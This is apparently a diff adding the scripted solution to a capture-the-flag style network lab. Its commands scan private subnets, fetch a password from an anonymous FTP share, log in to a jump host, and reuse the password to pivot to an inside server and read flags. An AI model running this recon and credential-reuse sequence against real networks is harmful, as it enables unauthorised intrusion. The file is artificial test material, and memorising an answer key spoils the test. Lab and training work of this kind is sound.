@@ -1,0 +1,24 @@
+## only jump01 is reachable from your network
+nmap -sn 10.10.7.0/24
+nmap -sV 10.10.7.20
+## anonymous FTP has a handover note with the pilot password
+ftp 10.10.7.20
+anonymous
+x
+cd pub
+get handover.txt
+bye
+cat handover.txt
+## sign in to the jump host and take its flag
+ssh -o StrictHostKeyChecking=accept-new pilot@10.10.7.20
+{{JPW}}
+cat flag.txt
+## jump01 is on a second network your box can't see
+ip addr
+nmap -sn 10.10.72.0/24
+## the password is reused on the inside server; ssh to it from the jump host
+ssh -o StrictHostKeyChecking=accept-new pilot@10.10.72.10
+{{JPW}}
+cat flag.txt
+exit
+exit
